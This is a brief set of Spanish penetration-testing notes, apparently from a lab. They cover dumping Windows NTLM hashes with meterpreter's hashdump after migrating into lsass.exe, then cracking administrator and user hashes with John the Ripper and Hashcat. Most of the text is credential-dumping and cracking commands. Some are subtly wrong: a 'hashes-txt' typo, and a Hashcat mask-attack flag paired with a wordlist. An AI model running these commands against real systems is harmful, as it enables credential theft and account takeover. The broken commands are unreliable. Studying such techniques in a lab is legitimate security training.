En una sesión de meterpreter con el comando `hashdump` obtenemos los hashes. Este comando saca los hashes de la cache SAM guardada en el proceso lsass.exe por lo que sería buena idea migrar al proceso: `migrate -N lsass.exe`

![[Pasted image 20250304183622.png]]

Copiamos tal cual las lineas 1 y 2 con los hashes respectivos a administrator y bob y los pegamos en un fichero hashes.txt:
![[Pasted image 20250304183720.png]]


## Cracking with john the ripper

Listar formatos disponibles en john the ripper: `john --list=formats`

Crackear con el diccionario por defecto de john:
`john --format=NT hashes.txt`

Crackear especificando diccionario:
`john --format=NT hashes-txt --wordlist=/usr/share/wordlists/rockyou.txt`

## Cracking with Hashcat

`hashcat -m 1000 -a 3 hashes.txt /usr/share/wordlists/rockyou.txt`

-m : el tipo de hash, el 1000 es NTLM
-a : el tipo de ataque , 3 es fuerza bruta.